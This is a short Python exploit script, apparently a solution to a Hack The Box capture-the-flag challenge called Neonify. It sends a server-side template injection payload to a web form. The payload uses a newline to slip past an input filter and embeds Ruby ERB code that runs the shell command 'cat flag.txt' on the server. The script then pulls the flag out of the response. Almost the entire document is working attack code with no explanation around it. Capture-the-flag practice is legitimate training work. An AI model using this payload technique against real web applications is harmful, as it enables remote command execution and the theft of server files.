import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit_neonify.py <ip:port>")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/"

# newline bypass
payload = "a\n<%= %x(cat flag.txt) %>"

data = {
    "neon": payload
}

r = requests.post(url, data=data)

# Searching flag in response
flag = re.search(r"HTB\{.*?\}", r.text)
if flag:
    print("Flag:", flag.group(0))
else:
    print("Flag not found!")
